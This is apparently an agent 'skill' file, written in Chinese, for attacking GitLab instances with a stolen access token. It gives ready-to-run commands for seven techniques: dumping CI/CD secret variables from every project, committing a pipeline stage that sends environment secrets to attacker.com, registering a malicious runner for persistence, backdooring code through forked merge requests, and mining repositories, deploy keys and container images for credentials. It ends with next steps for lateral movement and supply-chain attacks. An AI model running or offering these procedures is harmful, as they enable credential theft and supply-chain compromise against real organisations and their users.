---
name: gitlab-attack
type: attack
category: ci-cd-exploitation
platform: gitlab
severity: high
---

# GitLab 攻击技能

## 触发条件

- 发现 GitLab 实例
- 有 GitLab Token
- 用户要求"攻击 GitLab"

## 前置检查

```bash
# 1. 验证 Token
curl -H "PRIVATE-TOKEN: TOKEN" https://gitlab.com/api/v4/user

# 2. 列出项目
curl -H "PRIVATE-TOKEN: TOKEN" "https://gitlab.com/api/v4/projects?membership=true"
```

## 攻击方法

### 方法 1: CI/CD Variables 窃取

```bash
# 1. 列出所有项目
curl -H "PRIVATE-TOKEN: TOKEN" "https://gitlab.com/api/v4/projects" | jq -r '.[].id'

# 2. 获取 CI/CD 变量
curl -H "PRIVATE-TOKEN: TOKEN" \
  "https://gitlab.com/api/v4/projects/PROJECT_ID/ci/variables"

# 3. 获取敏感变量
curl -H "PRIVATE-TOKEN: TOKEN" \
  "https://gitlab.com/api/v4/projects/PROJECT_ID/ci/variables/KEY"

# 4. 批量获取所有项目的变量
for project in $(curl -s -H "PRIVATE-TOKEN: TOKEN" "https://gitlab.com/api/v4/projects" | jq -r '.[].id'); do
    echo "=== Project: $project ==="
    curl -s -H "PRIVATE-TOKEN: TOKEN" \
      "https://gitlab.com/api/v4/projects/$project/ci/variables"
done
```

### 方法 2: Pipeline 注入

```bash
# 1. 获取 .gitlab-ci.yml
curl -H "PRIVATE-TOKEN: TOKEN" \
  "https://gitlab.com/api/v4/projects/PROJECT_ID/repository/files/.gitlab-ci.yml/raw?ref=main"

# 2. 修改 pipeline 添加窃取步骤
cat > malicious-gitlab-ci.yml <<'EOF'
stages:
  - build
  - exfil

build:
  stage: build
  script:
    - echo "Building..."

exfil:
  stage: exfil
  script:
    - curl -X POST https://attacker.com/exfil -d "$(env | grep -E 'SECRET|TOKEN|PASSWORD')"
  only:
    - main
EOF

# 3. 提交修改
curl -X PUT \
  -H "PRIVATE-TOKEN: TOKEN" \
  "https://gitlab.com/api/v4/projects/PROJECT_ID/repository/files/.gitlab-ci.yml" \
  -d "branch=main&content=$(base64 -w 0 malicious-gitlab-ci.yml)&commit_message=update+pipeline"
```

### 方法 3: Runner 持久化

```bash
# 1. 列出 runners
curl -H "PRIVATE-TOKEN: TOKEN" "https://gitlab.com/api/v4/runners"

# 2. 注册恶意 runner
# 在攻击者机器上:
gitlab-runner register \
  --url https://gitlab.com \
  --registration-token REGISTRATION_TOKEN \
  --executor shell \
  --description "Malicious Runner"

# 3. Runner 可以访问所有 CI/CD variables
# 当 job 运行时，窃取所有变量
```

### 方法 4: Project Fork 攻击

```bash
# 1. Fork 项目
curl -X POST \
  -H "PRIVATE-TOKEN: TOKEN" \
  "https://gitlab.com/projects/PROJECT_ID/fork"

# 2. 修改代码添加后门

# 3. 创建 MR
curl -X POST \
  -H "PRIVATE-TOKEN: TOKEN" \
  "https://gitlab.com/projects/ATTACKER_PROJECT_ID/merge_requests" \
  -d "source_branch=main&target_branch=main&title=Fix+bug"
```

### 方法 5: Git 历史窃取

```bash
# 1. 克隆仓库
git clone https://TOKEN@gitlab.com/OWNER/REPO.git

# 2. 搜索敏感信息
cd REPO
git log -p | grep -E "password|secret|token|key" > secrets.txt

git log --all --full-history --source --all | grep -E "password|secret|token|key"

# 3. 搜索所有分支
git log --all --oneline | head -50

# 4. 检查敏感文件
grep -r "BEGIN.*PRIVATE KEY" .
grep -r "password.*=" . --include="*.env" --include="*.yml" --include="*.json"
```

### 方法 6: Deploy Keys 窃取

```bash
# 1. 列出 deploy keys
curl -H "PRIVATE-TOKEN: TOKEN" \
  "https://gitlab.com/api/v4/projects/PROJECT_ID/deploy_keys"

# 2. 如果有写权限，无法直接读取 key
# 但可以通过添加 deploy key 然后 push
```

### 方法 7: Container Registry 攻击

```bash
# 1. 列出容器镜像
curl -H "PRIVATE-TOKEN: TOKEN" \
  "https://gitlab.com/api/v4/projects/PROJECT_ID/registry/repositories"

# 2. 下载镜像
docker login registry.gitlab.com
docker pull registry.gitlab.com/OWNER/REPO:latest

# 3. 分析镜像
docker run -it registry.gitlab.com/OWNER/REPO:latest bash
# 在容器中搜索敏感信息
find / -name "*.env" -o -name "*.key" 2>/dev/null
```

## 验证成功

```bash
# 成功获取 variables
curl -H "PRIVATE-TOKEN: TOKEN" "https://gitlab.com/api/v4/projects/PROJECT_ID/ci/variables" | jq

# 成功修改 pipeline
# 等待下次 CI 运行

# 成功注册 runner
curl -H "PRIVATE-TOKEN: TOKEN" "https://gitlab.com/api/v4/runners" | jq
```

## 下一步

1. 使用窃取的 variables 访问其他服务
2. 通过 MR 供应链攻击
3. 通过 runner 持久化
